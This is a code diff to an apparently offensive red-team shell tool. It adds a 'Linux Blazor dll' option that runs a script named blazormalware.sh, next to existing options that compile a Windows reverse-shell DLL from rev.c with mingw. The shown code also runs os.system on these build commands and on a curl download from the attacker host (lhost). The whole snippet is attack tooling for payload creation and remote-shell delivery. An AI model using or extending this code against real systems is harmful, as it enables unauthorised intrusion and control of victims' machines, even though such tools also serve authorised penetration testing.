@@ -7742,8 +7742,8 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
         if not check_lhost(lhost):
             return
-        print_msg(f"{RED}1) {BLUE}Win32 Bit, {RED}2) {CYAN}Win64 Bit")
-        choice = input(f"    {MAGENTA}[?] Choice (1 or 2): ")
+        print_msg(f"{RED}1) {BLUE}Win32 Bit, {RED}2) {CYAN}Win64 Bit {RED}3){GREEN} Linux Blazor dll")
+        choice = input(f"    {MAGENTA}[?] Choice (1, 2 or 3): ")
         print_warn(f"Remeber: {GREEN}run lazymsfvenom {YELLOW}or {GREEN}venom {YELLOW} option 13 or 14, to create shellcode before! to replace in {RED}sessions/win/rev.c")
         if not is_binary_present("x86_64-w64-mingw32-gcc") or not is_binary_present("i686-w64-mingw32-gcc"):
             print_warn("mingw-w64 is not present in the system installing...")
@@ -7754,12 +7754,16 @@ class LazyOwnShell(Cmd):
 
         if choice == "1":
             command = f"x86_64-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
-        else:
+        elif choice == "2":
             command = f"i686-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
+        elif choice == "3":
+            command = f"./sessions/lin/blazormalware.sh {lhost} {line}"
+        
+        if choice == "1" or choice == "2":
+            cmd = "nano sessions/win/rev.c"
+            print_msg(f"Attemp to: {cmd}")
+            os.system(cmd)
 
-        cmd = "nano sessions/win/rev.c"
-        print_msg(f"Attemp to: {cmd}")
-        os.system(cmd)
         print_msg(f"Try... {command}")
         os.system(command)
         cmd = f"curl -o {line} http://{lhost}/{line}"
